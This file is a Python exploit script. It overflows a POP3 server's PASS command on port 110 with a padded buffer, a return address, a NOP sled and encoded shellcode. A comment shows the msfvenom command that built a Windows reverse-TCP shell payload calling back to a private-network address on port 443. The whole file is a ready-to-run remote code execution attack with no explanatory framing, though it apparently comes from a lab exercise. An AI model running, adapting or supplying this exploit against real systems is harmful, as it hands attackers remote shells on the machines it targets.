#!/usr/bin/python

import socket

#Create array of buffers
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.178.73 LPORT=443 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python

buf =  ""
buf += "\xdb\xd2\xb8\xd4\x04\xdd\x98\xd9\x74\x24\xf4\x5b\x2b"
buf += "\xc9\xb1\x52\x31\x43\x17\x83\xeb\xfc\x03\x97\x17\x3f"
buf += "\x6d\xeb\xf0\x3d\x8e\x13\x01\x22\x06\xf6\x30\x62\x7c"
buf += "\x73\x62\x52\xf6\xd1\x8f\x19\x5a\xc1\x04\x6f\x73\xe6"
buf += "\xad\xda\xa5\xc9\x2e\x76\x95\x48\xad\x85\xca\xaa\x8c"
buf += "\x45\x1f\xab\xc9\xb8\xd2\xf9\x82\xb7\x41\xed\xa7\x82"
buf += "\x59\x86\xf4\x03\xda\x7b\x4c\x25\xcb\x2a\xc6\x7c\xcb"
buf += "\xcd\x0b\xf5\x42\xd5\x48\x30\x1c\x6e\xba\xce\x9f\xa6"
buf += "\xf2\x2f\x33\x87\x3a\xc2\x4d\xc0\xfd\x3d\x38\x38\xfe"
buf += "\xc0\x3b\xff\x7c\x1f\xc9\x1b\x26\xd4\x69\xc7\xd6\x39"
buf += "\xef\x8c\xd5\xf6\x7b\xca\xf9\x09\xaf\x61\x05\x81\x4e"
buf += "\xa5\x8f\xd1\x74\x61\xcb\x82\x15\x30\xb1\x65\x29\x22"
buf += "\x1a\xd9\x8f\x29\xb7\x0e\xa2\x70\xd0\xe3\x8f\x8a\x20"
buf += "\x6c\x87\xf9\x12\x33\x33\x95\x1e\xbc\x9d\x62\x60\x97"
buf += "\x5a\xfc\x9f\x18\x9b\xd5\x5b\x4c\xcb\x4d\x4d\xed\x80"
buf += "\x8d\x72\x38\x06\xdd\xdc\x93\xe7\x8d\x9c\x43\x80\xc7"
buf += "\x12\xbb\xb0\xe8\xf8\xd4\x5b\x13\x6b\x1b\x33\xa9\x22"
buf += "\xf3\x46\xcd\xb5\xb8\xce\x2b\xdf\xae\x86\xe4\x48\x56"
buf += "\x83\x7e\xe8\x97\x19\xfb\x2a\x13\xae\xfc\xe5\xd4\xdb"
buf += "\xee\x92\x14\x96\x4c\x34\x2a\x0c\xf8\xda\xb9\xcb\xf8"
buf += "\x95\xa1\x43\xaf\xf2\x14\x9a\x25\xef\x0f\x34\x5b\xf2"
buf += "\xd6\x7f\xdf\x29\x2b\x81\xde\xbc\x17\xa5\xf0\x78\x97"
buf += "\xe1\xa4\xd4\xce\xbf\x12\x93\xb8\x71\xcc\x4d\x16\xd8"
buf += "\x98\x08\x54\xdb\xde\x14\xb1\xad\x3e\xa4\x6c\xe8\x41"
buf += "\x09\xf9\xfc\x3a\x77\x99\x03\x91\x33\xa9\x49\xbb\x12"
buf += "\x22\x14\x2e\x27\x2f\xa7\x85\x64\x56\x24\x2f\x15\xad"
buf += "\x34\x5a\x10\xe9\xf2\xb7\x68\x62\x97\xb7\xdf\x83\xb2"

nopsled = "\x90" * 20

buffer="A" * 2606 + "\x8f\x35\x4a\x5f" + nopsled + buf + "C" * (4000-2610-len(nopsled)-len(buf))


print "Fussing %s characters " % len(buffer)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.178.76', 110))
s.recv(1024)
s.send("USER test\r\n")
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.send('QUIT\r\n')
s.close()
